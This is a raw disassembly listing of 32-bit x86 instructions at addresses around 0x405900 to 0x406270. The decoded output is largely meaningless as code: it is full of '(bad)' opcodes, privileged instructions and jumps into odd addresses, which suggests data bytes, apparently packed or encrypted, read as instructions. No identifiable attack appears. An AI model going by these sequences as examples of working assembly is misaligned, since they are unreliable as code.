  40591e:	test   DWORD PTR [esi+0x17edf993],ecx
  405924:	xchg   esp,eax
  405925:	in     al,dx
  405926:	dec    ebp
  405927:	mov    ah,0x83
  405929:	stc    
  40592a:	dec    eax
  40592b:	lea    ecx,[edi+0x398ce194]
  405931:	pop    eax
  405932:	into   
  405933:	lea    ebp,[ebx+0x6c]
  405936:	loopne 0x40592b
	...
  40594c:	arpl   cx,di
  40594e:	dec    eax
  40594f:	add    al,0x90
  405951:	xchg   esp,eax
  405952:	loope  0x4058ef
  405954:	push   eax
  405955:	cmp    ah,cl
  405957:	add    ebx,esp
  405959:	stc    
  40595a:	pop    ebx
  40595b:	xor    BYTE PTR [ebx-0x7],al
  40595e:	popf   
  40595f:	(bad)  
  405960:	ror    DWORD PTR [ecx+ecx*4-0x7206bc32],0x9c
  405968:	push   ecx
  405969:	div    DWORD PTR [ebp-0x73]
  40596c:	mov    esp,0x17fc07f9
  405971:	icebp  
  405972:	icebp  
  405973:	sahf   
  405974:	add    ecx,edi
  405976:	fistp  QWORD PTR [eax+0x6cf6f919]
  40597c:	or     ebx,DWORD PTR [edi+esi*8+0x56]
  405980:	or     DWORD PTR [eax+eiz*2+0x4d],esp
  405984:	mov    cl,0x53
  405986:	or     BYTE PTR [ecx+0x1f],dl
  405989:	hlt    
  40598a:	idiv   BYTE PTR [esi]
  40598c:	subps  xmm6,XMMWORD PTR ds:0xf909
  405992:	mov    ch,BYTE PTR [esp+edx*4-0x7]
  405996:	mul    BYTE PTR [esi]
  405998:	nop
  405999:	or     BYTE PTR [ebp+0x6a],0x53
  40599d:	pop    esp
  40599e:	not    DWORD PTR [esi]
  4059a0:	or     DWORD PTR [eax+0xf0ccd7a],esp
  4059a6:	push   eax
  4059a7:	push   es
  4059a8:	sbb    ecx,edi
  4059aa:	or     edi,esi
  4059ac:	cmp    bl,BYTE PTR [edi+esi*8-0xa]
	...
  4059c4:	or     cl,bh
  4059c6:	jl     0x4059a9
  4059c8:	test   DWORD PTR [eax-0x39],0xa51418e6
  4059cf:	inc    ecx
  4059d0:	adc    eax,edi
  4059d2:	imul   ch
  4059d4:	xchg   ebp,eax
  4059d5:	div    esi
  4059d7:	push   esp
  4059d8:	jo     0x4059ca
  4059da:	lods   eax,DWORD PTR ds:[esi]
  4059db:	mov    dh,0x18
  4059dd:	clc    
  4059de:	div    BYTE PTR [edi+esi*4-0x9]
  4059e2:	div    BYTE PTR [esi-0x51a3bdf8]
  4059e8:	add    al,bh
  4059ea:	neg    BYTE PTR [eax+ecx*2]
  4059ed:	lock scas al,BYTE PTR es:[edi]
  4059ef:	scas   al,BYTE PTR es:[edi]
  4059f0:	adc    al,bh
  4059f2:	loop   0x4059d9
  4059f4:	xchg   ebp,eax
  4059f5:	xchg   esp,eax
  4059f6:	(bad)  
  4059f7:	jmp    0x40dbfc
  4059fc:	std    
  4059fd:	dec    ebp
  4059fe:	(bad)  
  4059ff:	jmp    DWORD PTR [edx-0x5dab42f8]
  405a05:	or     bh,dh
  405a07:	call   0x379ff9
  405a0c:	jb     0x405a6c
  405a0e:	push   esp
  405a0f:	jmp    DWORD PTR [edx+0x8]
  405a12:	loopne 0x4059d1
  405a14:	mov    bh,0x8
  405a16:	imul   DWORD PTR [ebx]
  405a18:	mov    esi,0x3450409b
  405a1d:	xchg   esp,eax
  405a1e:	loopne 0x405a5b
  405a20:	arpl   WORD PTR [ebx-0x289776f8],dx
  405a26:	cmc    
  405a27:	inc    DWORD PTR [eax]
	...
  405a39:	add    BYTE PTR [eax],al
  405a3b:	add    BYTE PTR [edx+0x722cb514],ah
  405a41:	or     bh,dh
  405a43:	add    BYTE PTR [ecx],bl
  405a45:	jmp    0xff08:0x52f5346e
  405a4c:	pop    eax
  405a4d:	xlat   BYTE PTR ds:[ebx]
  405a4e:	cmc    
  405a4f:	call   DWORD PTR [edx-0x4a424be5]
  405a55:	xchg   ebx,eax
  405a56:	add    eax,eax
  405a58:	sbb    ebp,edi
  405a5a:	adc    DWORD PTR [ebp-0x8f72b],0xffffffc7
  405a61:	or     ebx,eax
  405a63:	inc    ebx
  405a64:	jle    0x405a8c
  405a66:	jge    0x405a74
  405a68:	lock adc eax,0xb42ff38
  405a6e:	pop    eax
  405a6f:	call   0x48a7b9
  405a74:	mov    edi,0x558583f4
  405a79:	or     dh,bh
  405a7b:	push   DWORD PTR [ebp+0xb]
  405a7e:	jge    0x405a88
  405a80:	sbb    eax,0x22ffc7b6
  405a85:	or     edi,DWORD PTR [ebp-0x4]
  405a88:	mov    WORD PTR [esi],ds
  405a8a:	sbb    DWORD PTR [eax],ecx
  405a8c:	and    al,0x3f
  405a8e:	mov    bl,0xff
  405a90:	sub    ebp,DWORD PTR [esi-0xeb136d9]
  405a96:	or     dl,BYTE PTR [ebp+0x7]
  405a99:	adc    DWORD PTR [ebp-0x7c81db3c],ecx
  405a9f:	inc    DWORD PTR [eax]
	...
  405ab1:	add    BYTE PTR [eax],al
  405ab3:	add    BYTE PTR [ecx],bl
  405ab5:	sub    BYTE PTR [edi-0x11ffcb0],cl
  405abb:	inc    cl
  405abd:	mov    edx,0x558c4134
  405ac2:	adc    eax,0xf5ed8cbe
  405ac7:	mov    edi,0xab7093
  405acc:	mov    ebp,gs
  405ace:	leave  
  405acf:	inc    ebp
  405ad0:	aam    0xec
  405ad2:	or     al,BYTE PTR [eax]
  405ad4:	mov    WORD PTR [esi-0x123c0bb7],fs
  405ada:	or     al,BYTE PTR [eax]
  405adc:	es in  eax,dx
  405ade:	adc    al,0x0
  405ae0:	add    DWORD PTR [eax-0x70],esi
  405ae3:	imul   DWORD PTR [ebx-0x7395c373]
  405ae9:	push   0x703cf449
  405aee:	mov    esp,esi
  405af0:	fwait
  405af1:	in     eax,0x81
  405af3:	push   eax
  405af4:	mov    ebx,DWORD PTR [ecx-0x7c]
  405af7:	(bad)  
  405af8:	stc    
  405af9:	xlat   BYTE PTR ds:[ebx]
  405afa:	xchg   edx,eax
  405afb:	push   esp
  405afc:	cmp    ch,ah
  405afe:	or     cl,BYTE PTR [ebx]
  405b00:	dec    esp
  405b01:	pusha  
  405b02:	or     ecx,ebp
  405b04:	xor    esp,ebp
  405b06:	or     al,BYTE PTR [eax]
  405b08:	vmwrite ebx,DWORD PTR [edi+0xc3f5bf7]
  405b0f:	je     0x405a93
  405b11:	push   0x40
  405b13:	in     al,dx
  405b14:	inc    ebx
  405b15:	xchg   ebp,eax
  405b16:	scas   al,BYTE PTR es:[edi]
  405b17:	mov    al,BYTE PTR [eax]
	...
  405b29:	add    BYTE PTR [eax],al
  405b2b:	add    BYTE PTR [ebx-0x2e751380],cl
  405b31:	cld    
  405b32:	mov    DWORD PTR [ecx-0x5c],edx
  405b35:	jb     0x405b67
  405b37:	inc    ebp
  405b38:	mov    WORD PTR [edi],es
  405b3a:	fs (bad) 
  405b3c:	sbb    esi,esi
  405b3e:	jne    0x405b73
  405b40:	and    al,0x54
  405b42:	aas    
  405b43:	add    ecx,DWORD PTR [ecx+ecx*4+0x77d0fa1]
  405b4a:	fs fwait
  405b4c:	sti    
  405b4d:	cmc    
  405b4e:	push   ebp
  405b4f:	xor    ecx,DWORD PTR [ecx]
  405b51:	adc    BYTE PTR [ebp-0x6e],dl
  405b54:	repz cmc 
  405b56:	mov    al,0x8a
  405b58:	popa   
  405b59:	mov    BYTE PTR [esi-0x30],cl
  405b5c:	mov    esi,0xe403a04c
  405b61:	iret   
  405b62:	adc    al,0x8a
  405b64:	ror    DWORD PTR [ecx+0xb5d0f21],cl
  405b6a:	fs xchg ebx,eax
  405b6c:	mov    ebx,0x8d1b15f5
  405b71:	xchg   esp,eax
  405b72:	push   cs
  405b73:	dec    ecx
  405b74:	mov    bl,0x7f
  405b76:	jmp    0xe06af16
  405b7b:	mov    cl,BYTE PTR [edi]
  405b7d:	cmp    BYTE PTR ds:0xdff59b92,al
  405b83:	adc    BYTE PTR [eax+0x18ae16a],al
  405b89:	(bad)  
  405b8a:	fnop   
  405b8c:	push   ecx
  405b8d:	cmc    
  405b8e:	aad    0x9d
	...
  405ba4:	xchg   BYTE PTR [edx-0x20],ch
  405ba7:	mov    cl,bh
  405ba9:	mov    ecx,cs
  405bab:	fcomp  QWORD PTR [ecx-0xb]
  405bae:	int    0x89
  405bb0:	sbb    esp,ebp
  405bb2:	mov    ebp,0x7f55b89
  405bb7:	jl     0x405bb1
  405bb9:	cld    
  405bba:	imul   BYTE PTR [esi-0x6eff80eb]
  405bc0:	add    dh,0xf6
  405bc3:	sahf   
  405bc4:	add    eax,0x59ef83f
  405bc9:	cmc    
  405bca:	fbstp  TBYTE PTR [ecx]
  405bcc:	fcomip st,st(4)
  405bce:	test   BYTE PTR [esi-0x2e1f039d],0x4
  405bd5:	cmc    
  405bd6:	div    BYTE PTR [esi-0x7d]
  405bd9:	clc    
  405bda:	fcomip st,st(5)
  405bdc:	push   edx
  405bdd:	xchg   esp,eax
  405bde:	or     BYTE PTR [eax],dh
  405be0:	retf   0x88b
  405be3:	mov    ah,0x78
  405be5:	call   0xfd6c8972
  405bea:	test   BYTE PTR [esi+0x63],0x4f
  405bee:	hlt    
  405bef:	cdq    
  405bf0:	adc    al,0x7f
  405bf2:	add    al,0x3e
  405bf4:	retf   
  405bf5:	loope  0x405c36
  405bf7:	test   al,0x8f
  405bf9:	in     al,dx
  405bfa:	push   edx
  405bfb:	ins    BYTE PTR es:[edi],dx
  405bfc:	nop
  405bfd:	xchg   esp,eax
  405bfe:	add    ebp,DWORD PTR [ecx]
  405c00:	lds    ecx,FWORD PTR [edi]
  405c02:	pop    ebx
  405c03:	call   0xad0ff097
	...
  405c1c:	pop    es
  405c1d:	xchg   esp,eax
  405c1e:	or     cl,ch
  405c20:	(bad)  
  405c21:	int    0x4c
  405c23:	std    
  405c24:	adc    al,0x8d
  405c26:	or     cl,ch
  405c28:	jns    0x405bbe
  405c2a:	(bad)  
  405c2b:	jmp    0xe9a2f0a1
  405c30:	add    bl,BYTE PTR [edx-0x4]
  405c33:	cmp    ebx,edi
  405c35:	sbb    esp,edi
  405c37:	(bad)  
  405c38:	add    al,0xf4
  405c3a:	push   edi
  405c3b:	(bad)  
  405c3c:	sub    ah,0xf6
  405c3f:	push   esp
  405c40:	adc    al,0xfd
  405c42:	and    al,0x0
  405c44:	or     BYTE PTR [eax-0x5bdaf4f8],bl
  405c4a:	or     eax,0x89733e9
  405c4f:	add    ch,cl
  405c51:	dec    ebp
  405c52:	inc    eax
  405c53:	inc    ecx
  405c54:	xor    eax,0x1d0c7d1d
  405c59:	sahf   
  405c5a:	fdiv   st(7),st
  405c5c:	sbb    ch,BYTE PTR [eax+0x72c8d083]
  405c62:	cld    
  405c63:	test   DWORD PTR [edx],0xfd52581d
  405c69:	(bad)  
  405c6a:	fdiv   st(7),st
  405c6c:	call   0xf71c:0x82f08d6e
  405c73:	call   0x378429
  405c78:	fist   WORD PTR [edi+0x57344b60]
  405c7e:	or     bh,bh
	...
  405c94:	add    BYTE PTR [eax],cl
  405c96:	(bad)  
  405c97:	dec    DWORD PTR [edx+0x1c]
  405c9a:	cmp    eax,0x8571dd3
  405c9f:	call   0x378545
  405ca4:	sub    al,0x72
  405ca6:	in     al,dx
  405ca7:	imul   DWORD PTR [edx+0x1c]
  405caa:	bound  eax,QWORD PTR [eax]
  405cac:	sbb    eax,0xa54159c4
  405cb1:	sbb    al,0xbd
  405cb3:	lock sbb BYTE PTR [edi+esi*8],0xff
  405cb8:	loopne 0x405ce2
  405cba:	inc    eax
  405cbb:	inc    ecx
  405cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cbd:	(bad)  
  405cbf:	rcr    DWORD PTR [edx-0x767a7ee5],cl
  405cc5:	and    esi,edi
  405cc7:	(bad)  
  405cc8:	fistp  WORD PTR [eax+0x59b45d60]
  405cce:	or     bh,bh
  405cd0:	mov    WORD PTR [eax],ss
  405cd2:	pushf  
  405cd3:	imul   DWORD PTR [ebx-0x1e]
  405cd6:	mov    ?,WORD PTR ds:0x4da53f
  405cdc:	fs gs mov ebx,0x897453ff
  405ce3:	call   0x83cf9f2b
  405ce8:	add    DWORD PTR [ecx],esp
  405cea:	xchg   edi,edi
  405cec:	cmp    edi,ebp
  405cee:	push   es
  405cef:	dec    ecx
  405cf0:	cmovs  edx,DWORD PTR [eax+0xc222bf7]
  405cf7:	je     0x405cf9
	...
  405d09:	add    BYTE PTR [eax],al
  405d0b:	add    ah,cl
  405d0d:	jle    0x405d50
  405d0f:	call   0xcfcf37
  405d14:	cwde   
  405d15:	xor    dl,BYTE PTR [ebx]
  405d17:	add    BYTE PTR [edx+esi*2-0x1a8600b2],cl
  405d1e:	xchg   edx,eax
  405d1f:	repz enter 0x8f51,0xff
  405d24:	cmp    DWORD PTR [ecx-0x79],ebx
  405d27:	(bad)  
  405d28:	jmp    0x405d8b
  405d2a:	sbb    DWORD PTR [eax],ecx
  405d2c:	hlt    
  405d2d:	inc    ecx
  405d2e:	mov    al,0xff
  405d30:	(bad)  [ecx-0x562417a7]
  405d36:	(bad)  
  405d37:	inc    DWORD PTR [ecx-0xb]
  405d3a:	xchg   edx,eax
  405d3b:	cmp    ecx,edx
  405d3d:	mov    ecx,0x9901ff8f
  405d42:	xchg   edi,edi
  405d44:	mov    bl,0x89
  405d46:	sbb    DWORD PTR [eax],ecx
  405d48:	mov    ah,0xd5
  405d4a:	scas   eax,DWORD PTR es:[edi]
  405d4b:	jmp    DWORD PTR [ebx-0x5c1ba667]
  405d51:	icebp  
  405d52:	(bad)  
  405d53:	call   0xffcfead9
  405d58:	mov    ebp,DWORD PTR [ecx-0x6a7c0870]
  405d5e:	out    dx,al
  405d5f:	fwait
  405d60:	mov    es,esp
  405d62:	aad    0x86
  405d64:	jae    0x405d8e
  405d66:	leave  
  405d67:	mov    gs,WORD PTR [ebx-0xe]
  405d6a:	enter  0x538e,0xf2
  405d6e:	int    0x86
	...
  405d84:	and    ebp,esp
  405d86:	mov    ebp,0x33f25386
  405d8b:	cld    
  405d8c:	xor    edi,DWORD PTR [eax]
  405d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d8f:	xchg   BYTE PTR [ebx-0xe],al
  405d92:	push   ebx
  405d93:	xchg   ebx,eax
  405d94:	inc    ebx
  405d95:	repnz xchg ebp,eax
  405d97:	fwait
  405d98:	push   edx
  405d99:	loop   0x405d38
  405d9b:	xchg   BYTE PTR [ebx],ch
  405d9d:	pop    eax
  405d9e:	cdq    
  405d9f:	pushf  
  405da0:	loopne 0x405d94
  405da2:	lea    eax,[esi-0x648a97e5]
  405da8:	push   ss
  405da9:	cs loope 0x405daf
  405dac:	aad    0xd6
  405dae:	call   0x5d5db6b6
  405db3:	adc    al,0xf0
  405db6:	fiadd  DWORD PTR [ebx]
  405db8:	xchg   bx,ax
  405dba:	pop    esi
  405dbb:	adc    BYTE PTR [esp+edi*8-0xe1c48b0],dl
  405dc2:	ja     0x405e04
  405dc4:	fdivr  DWORD PTR [ebp+ecx*8+0x33]
  405dc8:	dec    ebp
  405dc9:	xchg   esp,eax
  405dca:	adc    BYTE PTR ds:[esp+edi*8-0xe3c7a34],dl
  405dd2:	cwde   
  405dd3:	sbb    BYTE PTR [ebx+edx*2-0x1f],0x86
  405dd8:	cmp    DWORD PTR [ecx+ecx*1+0x5f1aa2e],ebx
  405ddf:	sbb    ebp,edi
  405de1:	inc    esp
  405de2:	mov    al,ds:0xf9679b03
  405de7:	fwait
	...
  405dfc:	inc    esi
  405dfd:	repnz pop es
  405dff:	not    BYTE PTR [ecx]
  405e01:	jl     0x405dc5
  405e03:	cdq    
  405e04:	enter  0xf794,0x5c
  405e08:	js     0x405e03
  405e0a:	fmul   QWORD PTR es:[ecx]
  405e0d:	icebp  
  405e0e:	pop    edi
  405e0f:	(bad)  [eax-0x6c31f7ad]
  405e15:	pushf  
  405e16:	loopne 0x405e23
  405e18:	adc    esi,ecx
  405e1a:	not    BYTE PTR [ecx+0x65]
  405e1d:	inc    esp
  405e1e:	dec    ecx
  405e1f:	jmp    0xc140c534
  405e24:	xor    esi,eax
  405e26:	mul    BYTE PTR [esi-0x610b98ef]
  405e2c:	sbb    DWORD PTR [eax+eiz*8-0x90f1b4d],0xffffffa0
  405e34:	dec    esi
  405e35:	cwde   
  405e36:	or     BYTE PTR [edx*4-0x7016a000],bl
  405e3d:	add    DWORD PTR [esi-0x85f648a],esi
  405e43:	hlt    
  405e44:	pop    es
  405e45:	stc    
  405e46:	pop    ecx
  405e47:	pop    esp
  405e48:	adc    ecx,esi
  405e4a:	shr    BYTE PTR [ebx],0xf0
  405e4d:	lock pop ebx
  405e4f:	bound  eax,QWORD PTR [edx*1-0x5e70228b]
  405e56:	mov    WORD PTR [ebx],cs
  405e58:	(bad)  
  405e59:	xchg   esp,eax
  405e5a:	or     BYTE PTR [esi],bh
  405e5c:	and    DWORD PTR [eax+0xb5e0],0x0
	...
  405e73:	add    ch,dh
  405e75:	lock mul dl
  405e78:	iret   
  405e79:	data16 sbb BYTE PTR [ecx-0x16b6a3a0],dl
  405e80:	or     BYTE PTR [edi+0x4],ah
  405e83:	add    DWORD PTR [edx+0x270ef6c5],esp
  405e89:	push   edi
  405e8a:	add    al,0x0
  405e8c:	call   DWORD PTR [eax+eiz*2+0x855f487]
  405e93:	push   0x49a3e7
  405e98:	jb     0x405e79
  405e9a:	(bad)  [eax-0x5c]
  405e9d:	cwde   
  405e9e:	loopne 0x405eb9
  405ea0:	aaa    
  405ea1:	sbb    edi,esi
  405ea3:	or     esi,DWORD PTR ds:0xa55016a0
  405ea9:	sbb    DWORD PTR [ebp+0xc],edi
  405eac:	cmp    eax,0x12ffda66
  405eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb2:	pop    eax
  405eb3:	dec    DWORD PTR [eax-0xd6e1110]
  405eb9:	sbb    bh,dh
  405ebb:	call   0x3788c9
  405ec0:	sbb    eax,0x2ffc639
  405ec5:	mov    cs,WORD PTR [eax]
  405ec7:	push   0x49a2aa
  405ecc:	jge    0x405f30
  405ece:	pop    ecx
  405ecf:	inc    ecx
  405ed0:	and    eax,0xf5000a8c
  405ed5:	adc    esp,eax
  405ed7:	loope  0x405ed9
	...
  405ee9:	add    BYTE PTR [eax],al
  405eeb:	add    BYTE PTR [ecx+ebx*1],ah
  405eee:	test   DWORD PTR [ebx],0x50169fa5
  405ef4:	xor    eax,0x4d0c7d19
  405ef9:	mov    ebp,0xa352ffda
  405efe:	pop    eax
  405eff:	call   FWORD PTR [eax]
  405f01:	in     al,dx
  405f02:	out    dx,al
  405f03:	pop    ecx
  405f04:	xchg   edx,eax
  405f05:	sbb    bh,dh
  405f07:	call   0x37891d
  405f0c:	dec    ebp
  405f0d:	push   eax
  405f0e:	(bad)  
  405f0f:	push   DWORD PTR [edx-0x73]
  405f12:	or     BYTE PTR [eax+0x2a],ch
  405f15:	mov    ds:0x158c0049,al
  405f1a:	inc    esi
  405f1b:	push   ecx
  405f1c:	dec    ebp
  405f1d:	std    
  405f1e:	mov    esi,DWORD PTR ds:0x4a25bf
  405f24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f25:	inc    ebp
  405f26:	mov    edx,0xcaf28bff
  405f2b:	je     0x405ecf
  405f2d:	or     eax,0xea01ff3b
  405f32:	bound  esp,QWORD PTR [ecx]
  405f34:	pop    esi
  405f35:	into   
  405f36:	mov    dl,BYTE PTR [eax-0x44]
  405f39:	(bad)  
  405f3a:	lock pop es
  405f3c:	je     0x405edb
  405f3e:	mov    edi,edi
  405f40:	pop    ebx
  405f41:	(bad)  
  405f44:	push   ebx
  405f45:	cs outs dx,BYTE PTR fs:[esi]
  405f48:	pop    edx
  405f49:	mov    ebp,DWORD PTR es:[edx-0x74]
  405f4d:	push   ebp
  405f4e:	adc    DWORD PTR [ecx+0x0],0x0
	...
  405f62:	add    BYTE PTR [eax],al
  405f64:	int    0xfd
  405f66:	loop   0x405f1c
  405f68:	fnstsw WORD PTR [esp+ecx*1+0xafd8e68]
  405f6f:	xor    BYTE PTR [ecx*4-0x1de400a3],0x4a
  405f77:	je     0x405feb
  405f79:	(bad)  
  405f7a:	fdiv   st(6),st
  405f7c:	cmp    ecx,0x7ddde962
  405f82:	mov    edx,DWORD PTR [eax+0x5c]
  405f85:	jbe    0x405f78
  405f87:	pop    es
  405f88:	in     al,0x44
  405f8a:	mov    bh,bh
  405f8c:	jmp    0x405fe2
  405f8e:	aaa    
  405f8f:	into   
  405f90:	jecxz  0x405fef
  405f92:	fs ss retf 0x8b55
  405f97:	push   0xffcc0c6b
  405f9c:	retf   0x72f
  405f9f:	call   0xffcbeb78
  405fa4:	pop    esp
  405fa5:	xchg   esp,eax
  405fa6:	mov    cl,0x82
  405fa8:	cmp    DWORD PTR [ecx+ebx*1+0x1deeaa4b],ebx
  405faf:	ins    BYTE PTR es:[edi],dx
  405fb0:	xchg   dh,bl
  405fb2:	add    eax,0xfd689b83
  405fb7:	imul   edi,DWORD PTR [esi-0x22],0xfffffff5
  405fbb:	adc    BYTE PTR [ebp-0x2d],0xe8
  405fbf:	add    ebx,ecx
  405fc1:	sbb    ebp,esi
  405fc3:	xchg   BYTE PTR [eax-0x17],dl
  405fc6:	pop    edx
  405fc7:	add    al,0x0
	...
  405fd9:	add    BYTE PTR [eax],al
  405fdb:	add    dh,ah
  405fdd:	xchg   edx,eax
  405fde:	(bad)  
  405fdf:	clc    
  405fe0:	xchg   ebx,eax
  405fe1:	cld    
  405fe2:	adc    al,0x4f
  405fe4:	arpl   si,bp
  405fe6:	addr16 enter 0x7d57,0xe4
  405feb:	add    al,0x8c
  405fed:	xchg   esp,eax
  405fee:	(bad)  [ecx]
  405ff0:	pop    edx
  405ff1:	out    dx,al
  405ff2:	mov    ebp,0x48ecc98c
  405ff7:	or     BYTE PTR [ebp-0x467d1e6c],cl
  405ffd:	in     al,dx
  405ffe:	cwde   
  405fff:	test   ch,ah
  406001:	xchg   esp,eax
  406002:	loope  0x406012
  406004:	dec    esp
  406005:	imul   edi,ebp,0xe1939040
  40600b:	add    ebx,DWORD PTR [ebx+0x3f8769f]
  406011:	out    dx,al
  406012:	repz or esi,esp
  406015:	sbb    al,0x67
  406017:	cmp    bl,0xf9
  40601a:	clc    
  40601b:	cmp    BYTE PTR [ecx-0x14],0x58
  40601f:	ret    0xedd9
  406022:	pop    ebp
  406023:	in     eax,dx
  406024:	stos   DWORD PTR es:[edi],eax
  406025:	cld    
  406026:	lock push ebp
  406028:	fucomi st,st(5)
  40602a:	nop
  40602b:	sbb    BYTE PTR [ecx-0x64],0x59
  40602f:	icebp  
  406030:	leave  
  406031:	in     eax,dx
  406032:	pop    es
  406033:	ss mov cl,0x8b
  406036:	loopne 0x406021
  406038:	popa   
  406039:	in     eax,dx
  40603a:	div    dl
  40603c:	dec    edi
  40603d:	push   0x911c
	...
  406052:	add    BYTE PTR [eax],al
  406054:	mov    ds:0xbfe94944,al
  406059:	cmc    
  40605a:	cmp    DWORD PTR [eax],0xe
  40605d:	out    dx,al
  40605e:	push   edi
  40605f:	push   es
  406060:	xchg   esp,eax
  406061:	xchg   ebp,eax
  406062:	loopne 0x406012
  406064:	or     eax,0xaa83f6ed
  406069:	cld    
  40606a:	call   0x32d6e87
  40606f:	test   eax,0x5a608174
  406074:	aas    
  406075:	push   esp
  406076:	or     BYTE PTR [ecx],bh
  406078:	lock jg 0x406054
  40607b:	into   
  40607c:	or     eax,0x803cf744
  406081:	cld    
  406082:	aaa    
  406083:	mov    edi,0xd561ed0d
  406088:	mov    bh,0xd2
  40608a:	fsubr  DWORD PTR [esi+0x1dc8990d]
  406090:	xchg   esp,eax
  406091:	jl     0x40610e
  406093:	cmp    BYTE PTR [edi-0x13],cl
  406096:	inc    esi
  406097:	cmp    DWORD PTR [esi],0x408ef6c4
  40609d:	out    dx,al
  40609e:	jl     0x406091
  4060a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060a1:	xor    esi,0x7e
  4060a4:	or     eax,0x8c01087a
  4060a9:	inc    ebx
  4060aa:	dec    ecx
  4060ab:	jmp    0xa8996397
  4060b0:	(bad)  
  4060b1:	in     eax,dx
  4060b2:	cmp    al,0x3a
  4060b4:	fcom   DWORD PTR [ebx+0x8]
  4060b7:	inc    ecx
	...
  4060cc:	mov    ecx,0xc04ef6dc
  4060d1:	in     eax,dx
  4060d2:	jl     0x4060d4
  4060d4:	fnstsw WORD PTR [eax-0x7]
  4060d7:	std    
  4060d8:	mov    dl,BYTE PTR [ebx]
  4060da:	bound  eax,QWORD PTR [eax]
  4060dc:	int    0x1b
  4060de:	pop    ecx
  4060df:	inc    ecx
  4060e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e1:	clc    
  4060e2:	cwde   
  4060e3:	push   ecx
  4060e4:	in     al,0x90
  4060e6:	div    DWORD PTR ds:0x47e066
  4060ec:	lea    esp,[edi-0x60750028]
  4060f2:	enter  0xb374,0x19
  4060f6:	dec    ebp
  4060f7:	hlt    
  4060f8:	mov    ah,bl
  4060fa:	cli    
  4060fb:	inc    DWORD PTR [eax]
  4060fd:	mov    al,ds:0x1568b1e0
  406102:	idiv   edi
  406104:	shr    BYTE PTR [eax+eiz*8+0x1],1
  406108:	cmp    BYTE PTR ds:0x756af7,dl
  40610e:	jae    0x406161
  406110:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406111:	nop
  406112:	pusha  
  406113:	mov    ch,0x74
  406115:	xlat   BYTE PTR ds:[ebx]
  406116:	idiv   dh
  406118:	inc    eax
  406119:	inc    ecx
  40611a:	inc    eax
  40611b:	inc    ecx
  40611c:	xor    eax,0xead00a80
  406121:	adc    al,0x58
  406123:	call   DWORD PTR [eax+0x8a0e098]
  406129:	adc    eax,0x356af7
  40612e:	mov    ss,WORD PTR [ecx+0x0]
	...
  406141:	add    BYTE PTR [eax],al
  406143:	add    BYTE PTR [eax+edx*4+0x60],ah
  406147:	mov    ch,0x74
  406149:	xlat   BYTE PTR ds:[ebx]
  40614a:	idiv   dh
  40614c:	inc    eax
  40614d:	inc    ecx
  40614e:	inc    eax
  40614f:	inc    ecx
  406150:	cmc    
  406151:	jg     0x40613d
  406153:	iret   
  406154:	push   0x14
  406156:	add    eax,eax
  406158:	ror    DWORD PTR [ebp+0x14414581],1
  40615e:	jge    0x406154
  406160:	mov    WORD PTR [edx-0x2],es
  406163:	pop    es
  406164:	in     al,0xdd
  406166:	jne    0x406167
  406168:	rcl    DWORD PTR [edx-0x2],cl
  40616b:	repz mov ah,0x6d
  40616e:	inc    edi
  40616f:	inc    ebx
  406171:	xlat   BYTE PTR ds:[ebx]
  406172:	or     ch,BYTE PTR [eax+0x38]
  406175:	or     al,0xca
  406177:	jmp    FWORD PTR [ebx]
  406179:	outs   dx,DWORD PTR ds:[esi]
  40617a:	fiadd  DWORD PTR [eax-0x74]
  40617d:	add    eax,0x7d8c000d
  406182:	arpl   WORD PTR [edx+0x50889acb],si
  406188:	xchg   ebx,eax
  406189:	push   0xe8dce803
  40618e:	jbe    0x40618f
  406190:	idiv   ch
  406192:	loop   0x40611a
  406194:	fnstsw WORD PTR [ebx+ecx*1]
  406197:	push   0xffcdac1e
  40619c:	repz dec DWORD PTR [edx]
  40619f:	add    BYTE PTR [edx*8-0x25a43066],cl
  4061a6:	add    al,al
	...
  4061bc:	fmul   st,st(3)
  4061be:	add    DWORD PTR [ebp+0x40],0x2a
  4061c2:	icebp  
  4061c3:	repz inc ebx
  4061c5:	test   al,0x4
  4061c7:	call   0xffb79a69
  4061cc:	xor    ecx,DWORD PTR [eax+0x39ade870]
  4061d2:	ja     0x4061d3
  4061d4:	mov    dh,0xfd
  4061d6:	loop   0x406253
  4061d8:	mov    ebp,0xd9680cbc
  4061dd:	mov    ecx,ebp
  4061df:	push   DWORD PTR [ebx-0x1]
  4061e2:	or     al,BYTE PTR [eax]
  4061e4:	or     al,0x15
  4061e6:	jmp    0x4061b6
  4061e8:	sti    
  4061e9:	jns    0x4061c7
  4061eb:	(bad)  
  4061ec:	jns    0x406182
  4061ee:	stc    
  4061ef:	imul   ecx,DWORD PTR [ebp+0x767f55e9],0xffffff94
  4061f6:	leave  
  4061f7:	xchg   BYTE PTR ds:0x18ebe155,bh
  4061fd:	inc    ebp
  4061fe:	mov    al,ds:0xe1963403
  406203:	add    ecx,DWORD PTR [esp+edi*8]
  406206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406207:	dec    esi
  406208:	mov    ebx,0x3843e9ea
  40620d:	cmp    BYTE PTR [eax-0x37],0x9f
  406211:	jmp    0x6be9:0x60a3779b
  406218:	into   
  406219:	out    0x5,eax
  40621b:	jg     0x4061b0
  40621d:	pusha  
  40621e:	cmc    
  40621f:	imul   eax,DWORD PTR [eax],0x0
	...
  406232:	add    BYTE PTR [eax],al
  406234:	sahf   
  406235:	fdiv   st,st(5)
  406237:	jle    0x4061bc
  406239:	pusha  
  40623a:	std    
  40623b:	jle    0x40623e
  40623d:	popf   
  40623e:	or     DWORD PTR [ecx+0x4cedea45],ecx
  406244:	dec    esi
  406245:	xchg   ecx,eax
  406246:	loope  0x406220
  406248:	push   ss
  406249:	stc    
  40624a:	dec    eax
  40624b:	add    al,0x8c
  40624d:	stc    
  40624e:	xchg   BYTE PTR [esi-0x27],bh
  406251:	cwde   
  406252:	into   
  406253:	clc    
  406254:	xchg   ebx,eax
  406255:	cld    
  406256:	mov    bl,0x74
  406258:	inc    ebx
  406259:	jmp    0x8b1c:0x948441a7
  406260:	and    BYTE PTR [eiz*4-0x6a15d549],dl
  406267:	inc    esi
  406268:	or     DWORD PTR ds:0x951b7e9f,ebp
  40626e:	loope  0x406273
